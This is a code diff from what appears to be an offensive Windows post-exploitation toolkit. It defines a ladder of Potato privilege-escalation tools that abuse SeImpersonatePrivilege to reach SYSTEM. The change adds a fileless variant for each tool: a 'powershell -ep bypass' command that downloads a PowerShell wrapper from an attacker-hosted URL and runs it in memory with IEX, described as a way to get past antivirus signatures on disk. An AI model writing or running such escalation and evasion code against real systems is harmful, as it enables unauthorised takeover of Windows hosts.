@@ -266,45 +266,50 @@ WIN_GROUPS = {
 #: presents; a live catch marks that technique red so the loop won't re-burn it.
 _IMPERSONATION_PRIVS = {"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"}
 
-#: The native Potato *tools* — each a different binary/technique/AV-signature, and each
-#: works on a different span of Windows. All are native-exe delivery, so the loop tries
-#: them in order (a functional miss — wrong OS, spooler off, denied — advances to the next
-#: variant), and an AV catch on the on-disk method climbs to the fileless/script deliveries
-#: below. Each auto-stages its own exe from the arsenal. (name, exe, command, note)
+#: The Potato *tools* — each a different binary/technique/AV-signature over a different span
+#: of Windows. Each yields TWO rungs generated below: a native ``.exe`` (auto-staged to disk)
+#: and a fileless ``.ps1`` equivalent (served over HTTP + IEX'd in memory). A functional miss
+#: advances to the next tool; an AV catch on the on-disk method climbs to the ps1 rungs.
+#: (slug, tool, exe-args, ps1-invocation-after-IEX, note). The ps1 invocation mirrors the .exe
+#: args — adjust to your Invoke-<Tool>.ps1 wrapper if it differs.
 _POTATOES = (
-    ("godpotato", "GodPotato", '{stage}\\GodPotato.exe -cmd "cmd /c whoami"',
+    ("godpotato", "GodPotato", '-cmd "cmd /c whoami"',
+     "Invoke-GodPotato -Cmd 'cmd /c whoami'",
      "GodPotato (RPC/DCOM, .NET) — broad: Server 2012–2022, Win8–11."),
-    ("printspoofer", "PrintSpoofer", '{stage}\\PrintSpoofer.exe -c "cmd /c whoami"',
+    ("printspoofer", "PrintSpoofer", '-c "cmd /c whoami"',
+     "Invoke-PrintSpoofer -c 'cmd /c whoami'",
      "PrintSpoofer abuses the Print Spooler named pipe — Server 2016–2019, Win10."),
     ("juicypotatong", "JuicyPotatoNG",
-     '{stage}\\JuicyPotatoNG.exe -t * -p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
+     '-t * -p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
+     "Invoke-JuicyPotatoNG -t * -p C:\\Windows\\System32\\cmd.exe -a '/c whoami'",
      "JuicyPotatoNG (DCOM) — the modern JuicyPotato successor."),
     ("sweetpotato", "SweetPotato",
-     '{stage}\\SweetPotato.exe -p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
+     '-p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
+     "Invoke-SweetPotato -p C:\\Windows\\System32\\cmd.exe -a '/c whoami'",
      "SweetPotato bundles several coercion techniques — a good fallback."),
     ("efspotato", "SharpEfsPotato",
-     '{stage}\\SharpEfsPotato.exe -p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
+     '-p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
+     "Invoke-SharpEfsPotato -p C:\\Windows\\System32\\cmd.exe -a '/c whoami'",
      "SharpEfsPotato abuses EFSRPC (MS-EFSR) — works where the spooler is disabled."),
 )
 
-WIN_IMPERSONATION = tuple(
+WIN_IMPERSONATION = tuple(   # native .exe rungs — auto-staged to disk
     dict(key=f"seimpersonate:{slug}", delivery="native-exe", detection="moderate",
          title=f"SeImpersonate → SYSTEM ({tool})",
          needs=f"{tool}.exe staged in {{stage}}",
-         command=cmd, cleanup=f"del {{stage}}\\{tool}.exe",
+         command=f'{{stage}}\\{tool}.exe {exe_args}', cleanup=f"del {{stage}}\\{tool}.exe",
          stages=((tool, f"{{stage}}\\{tool}.exe"),), detail=note)
-    for slug, tool, cmd, note in _POTATOES
-) + (
-    dict(key="seimpersonate:iex-godpotato", delivery="inmem-fileless", detection="moderate",
-         title="SeImpersonate → SYSTEM (Invoke-GodPotato, in-memory IEX)",
-         needs="Invoke-GodPotato.ps1 in the arsenal + a reachable lhost (config set lhost=)",
-         command="powershell -ep bypass -c \"IEX(New-Object Net.WebClient)."
-                 "DownloadString('{url}Invoke-GodPotato.ps1'); "
-                 "Invoke-GodPotato -Cmd 'cmd /c whoami'\"",
-         cleanup=None, shell="cmd", serves=("Invoke-GodPotato.ps1",),
-         detail="download + IEX the GodPotato PowerShell port in memory — nothing lands on "
-                "disk, so the on-disk EXE signature is moot. The loop climbs here when the "
-                "native Potatoes are caught; fieldkit serves the .ps1 while it runs."),
+    for slug, tool, exe_args, _ps, note in _POTATOES
+) + tuple(   # ps1 rungs — the fileless equivalent of each: served over HTTP + IEX'd
+    dict(key=f"seimpersonate:ps-{slug}", delivery="inmem-fileless", detection="moderate",
+         title=f"SeImpersonate → SYSTEM ({tool}, in-memory IEX)",
+         needs=f"Invoke-{tool}.ps1 in the arsenal + a reachable lhost (config set lhost=)",
+         command=f"powershell -ep bypass -c \"IEX(New-Object Net.WebClient)."
+                 f"DownloadString('{{url}}Invoke-{tool}.ps1'); {ps_invoke}\"",
+         cleanup=None, shell="cmd", serves=(f"Invoke-{tool}.ps1",),
+         detail=f"IEX the {tool} PowerShell wrapper in memory — nothing lands on disk, so "
+                f"the on-disk EXE signature is moot. Served over HTTP while it runs.")
+    for slug, tool, _exe_args, ps_invoke, _note in _POTATOES
 )
 
 
